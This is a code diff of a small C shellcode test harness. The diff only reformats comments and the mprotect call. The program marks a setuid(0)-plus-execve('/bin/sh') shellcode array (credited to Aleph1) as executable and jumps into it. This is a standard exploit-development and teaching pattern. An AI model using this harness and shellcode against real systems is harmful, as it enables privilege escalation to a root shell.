@@ -8,9 +8,17 @@ const char shellcode[] =  //setuid(0) & Aleph1's famous shellcode, see ref.
 "\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
 int main() { //main function
-    //The shellcode is on the .data segment, we will use mprotect to make the page executable.
-    mprotect((void *)((int)shellcode & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
-    //Convert the address of the shellcode variable to a function pointer, allowing us to call it and execute the code.
+
+    //The shellcode is on the .data segment,
+    //we will use mprotect to make the page executable.
+    mprotect(
+        (void *)((int)shellcode & ~4095),
+        4096,
+        PROT_READ | PROT_WRITE | PROT_EXEC
+    );
+
+    //Convert the address of the shellcode variable to a function pointer,
+    //allowing us to call it and execute the code.
     int (*ret)() = (int(*)())shellcode;
     return ret();
 }
